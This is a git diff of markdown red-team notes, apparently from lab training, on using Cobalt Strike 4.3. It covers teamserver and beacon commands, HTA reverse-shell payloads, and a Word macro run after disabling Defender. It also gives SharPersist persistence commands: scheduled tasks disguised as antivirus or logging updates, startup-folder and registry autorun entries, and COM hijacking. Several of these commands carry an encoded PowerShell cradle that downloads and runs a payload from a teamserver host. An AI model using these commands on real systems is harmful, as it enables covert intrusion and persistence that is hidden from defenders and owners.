@@ -1,15 +1,17 @@
-### How to start cobalt strike 4.3 ?
+### Starting CS
+#### How to start cobalt strike 4.3 ?
 1. First start team server `./teamserver <KALI IP> <some password> <some C2 malleable profile>`
 2. First start team server `./teamserver 192.168.10.200 password123 havex.profile`
 3. Then `./start.sh`
 
-### Useful commands for CS 4.3?
+#### Useful commands for CS 4.3?
 1. Change beacon time `sleep <digit number>`
 2. E.g Change beacon time to 02 seconds `sleep 2`
 3. Run commands via cmd.exe `shell <some command>`
 4. E.g `shell dir` or `shell whoami`
 
-### .hta file execution (requres Internet Explorer) 01 - Simple Hello World
+### HTA files
+#### .hta file execution (requres Internet Explorer) 01 - Simple Hello World
 ```
 <html>
   <head>
@@ -21,7 +23,7 @@
   </body>
 </html>
 ```
-### .hta file execution (requres Internet Explorer) 02 - Get reverse shell "console" is hidden
+#### .hta file execution (requres Internet Explorer) 02 - Get reverse shell "console" is hidden
 ```
 <html>
   <head>
@@ -42,7 +44,7 @@
   </script>
 </html>
 ```
-### .hta file execution (requres Internet Explorer) 03 - Get poweshell reverse shell
+#### .hta file execution (requres Internet Explorer) 03 - Get poweshell reverse shell
 1. In CS navigate to **Attacks > Web Drive-by > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload for HTTP listener**. The URI path can be anything for e.g I had it **/tempOld**. 
 2. By default if we use **powershell.exe** instead of giving the full path its not going to laucnh. This is because we have a **64bit** powershell payload but **.hta** uses **32 bit mstha.exe**. However, we can fix it by specifiying the fullpath with **sysnative**
 ```
@@ -66,7 +68,7 @@
   </script>
 </html>
 ```
-### .hta file execution (requres Internet Explorer) 04 - Get poweshell reverse shell after checking the desired architecture
+#### .hta file execution (requres Internet Explorer) 04 - Get poweshell reverse shell after checking the desired architecture
 ```
 <html>
   <head>
@@ -97,7 +99,8 @@
 2. Copy & Paste the macro in the MS Word document (remeber to use **.doc** not the **.docx**
 3. Disable Defender and Run it, you'll get the beacon 
 
-### Persistence for MS Windows via SharPersist - Mehtod schtask
+### Persistence
+#### Persistence for MS Windows via SharPersist - Mehtod schtask
 1. First generate the **x64 powershell** payload by **Attacks -> Web by Delivery -> Scripted Web Del (S)**
 2. The above will generate a **PS payload, hosted on the CS TeamServer and will be run in memory**
 3. E.g. it will be something like
@@ -112,16 +115,16 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 4. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "AV-Definition-Update" -m add -o hourly`
 5. `SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -n "SysMonLog" -m add -o logon`
 
-### Persistence for MS Windows via SharPersist - Mehtod startup folder
+#### Persistence for MS Windows via SharPersist - Mehtod startup folder
 1. `execute-assembly SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMgAwADAAOgA4ADAALwA2ADQAYgBpAHQAIgApACkA" -f "UserEnvSetup" -m add`
 2. If above command goes well, it create a file **UserEnvSetup** inside the path **C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup**
 
-### Persistence for MS Windows via SharPersist - Mehtod registry autorun
+#### Persistence for MS Windows via SharPersist - Mehtod registry autorun
 1. Generate a revershell exe from CS e.g **artifactx64.exe**. 
 2. Place this **artifactx64.exe** in that **C:\tools\malPayloads\artifactx64.exe** in Windows 10 OS. 
 3. `execute-assembly SharPersist.exe -t reg -c "C:\tools\malPayloads\artifactx64.exe" -a "/q /n" -k "hkcurun" -v "someNameYouWant" -m add`
 
-### Persistence for MS Windows via SharPersist - COM Hijacking DLL
+#### Persistence for MS Windows via SharPersist - COM Hijacking DLL
 1. Open **procmon64.exe** from **sysinternals suite**. 
 2. Apply filters **Operations ---> RegKeyOpen** and **Result ---> NAME NOT FOUND** and **PATH (ends with) ---> InprocServer32**. 
 3. Next open some program, e.g. **MS Word or maybe Edge** etc. 
